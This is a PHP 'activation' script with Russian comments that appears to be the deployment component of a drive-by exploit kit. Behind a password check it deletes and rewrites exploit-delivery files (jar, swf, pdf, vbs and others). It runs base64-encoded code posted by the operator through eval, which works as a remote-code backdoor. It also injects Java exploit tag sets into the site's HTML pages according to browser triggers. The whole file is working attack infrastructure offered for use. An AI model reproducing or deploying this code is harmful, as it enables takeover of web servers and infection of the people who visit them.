<?php
require_once( "yzbwkuivbvbtxra.php" );
$PIN=SHA1($_POST['password']);
if ($PIN==$ACTIVATION_PASSWORD)
	{
		//Функция для заливки файлов на хост
		function WriteFile($path,$data)
			{
				$file = $path;
				$fh = fopen($file, "w") or die("File ($file) does not exist!");
				fwrite($fh, $data);
				fclose($fh);
			}

		//Удаляем старые файлы выдачи
		//Если версия php <5 создаем функцию scandir
		if (!function_exists("scandir"))
			{
				function scandir($dir)
					{
						$dh = opendir($dir);
						while (false !== ($filename = readdir($dh)))
							{
								if (($filename != '.') && ($filename != '..'))
              								{
              									$files[] = $filename;
              								}
             						} 
       						closedir($dh);
       						sort($files);
						return $files;
       					}
			}

		$files=scandir(".");
		for ($i=1; $i <= sizeof($files); $i++ )
			{
				$temp=explode(".",$files[$i]);
				if (($temp[1]=="html") or ($temp[1]=="vbs") or ($temp[1]=="asx") or ($temp[1]=="pdf") or ($temp[1]=="jar") or ($temp[1]=="swf") or ($temp[1]=="ram") or ($temp[1]=="smil") or ($temp[1]=="gif") or ($temp[1]=="bin"))
					{
						if  ($temp[1]!="gif")
							{
								unlink($files[$i]);
							}
						else
							{
								if (filesize($files[$i])==43)
									{
										unlink($files[$i]);
									}
							}
					}
			}

		//Правим файл индекса
		$INDEXNAME=base64_decode($_POST['indexname']);
		$INDEX=base64_decode($_POST['index']);
		$sepparated=explode("/*SEPPARATOR*/",file_get_contents($INDEXNAME));
		$INDEX=$INDEX."/*SEPPARATOR*/".$sepparated[1];

		//Пишем файл индекса
		WriteFile($INDEXNAME,$INDEX);

		//Пишем все остальные файлы
		eval(base64_decode($_POST['data']));

		//Получаем имя файла статистики
		$STATISTICSNAME=base64_decode($_POST['sname']);

		//Проверяем наличие информации о наличии текущего режима
		if ( strstr( file_get_contents($STATISTICSNAME), "CURRENTJAVAMODE" ) )
			{
				//Если режим не установлен
				$MODE=base64_decode($_POST['mode']);
				$MODES=base64_decode($_POST['modes']);
				$stats=file_get_contents($STATISTICSNAME);
				$sepparatedstats=explode("/*SEPPARATOR*/",$stats);
				$stats="<?php\r\n\$currentmode=\"".$MODE."\";\r\n/*MODESEPPARATOR*/\r\n".$MODES."\r\n/*SEPPARATOR*/".$sepparatedstats[1];
				WriteFile($STATISTICSNAME,$stats);
			}
		else
			{
				//Если режим уже установлен
				function ChangeMode($mode)
					{
						global $tctags, $rmitags, $miditags;
						if ($mode=="rmi")
							{
								$javatags=$rmitags;
							}
						if ($mode=="midi")
							{
								$javatags=$miditags;
							}
						if ($mode=="tc")
							{
								$javatags=$tctags;
							}
						$sepparator="<body id='";
						$files=scandir(".");
						for ($i=1; $i <= sizeof($files); $i++ )
							{
								$filename=$files[$i];
								$temp=explode(".",$filename);
								if (($temp[1]=="html"))
									{	//Изменяем значение тригера
										if ( strstr( file_get_contents($filename), "isie" ) )
											{
												$javatagst=str_replace("VALUE_OF_TRIGGER", "isie", $javatags);
											}
										else if ( strstr( file_get_contents($filename), "notie" ) )
											{
												$javatagst=str_replace("VALUE_OF_TRIGGER", "notie", $javatags);
											}
										else
											{
												$javatagst="";
											}
										$sepparated=explode($sepparator,file_get_contents($filename));
										$output=$javatagst.$sepparator.$sepparated[1];
										WriteFile($filename,$output);
									}
							}
					}
				$stats=file_get_contents($STATISTICSNAME);
				$sepparatedstats=explode("/*SEPPARATOR*/",$stats);
				$curmode=explode("/*MODESEPPARATOR*/",$sepparatedstats[0]);
				$curmode=str_replace("<?php", "", $curmode[0]);
				eval($curmode); //Получаем переменную currentmode
				$MODES=base64_decode($_POST['modes']);
				eval($MODES); //Получаем теги режимов
				ChangeMode($currentmode); //Меняем режим на тот что прописан в файле статы
				$MODE=$currentmode;
				$stats="<?php\r\n\$currentmode=\"".$MODE."\";\r\n/*MODESEPPARATOR*/\r\n".$MODES."\r\n/*SEPPARATOR*/".$sepparatedstats[1];
				WriteFile($STATISTICSNAME,$stats);


			
			}








		echo "Activation was completed succesfully!";
	}
else
	{
		echo "Activation Password Is Invalid. Activation Rejected!";
	}

?>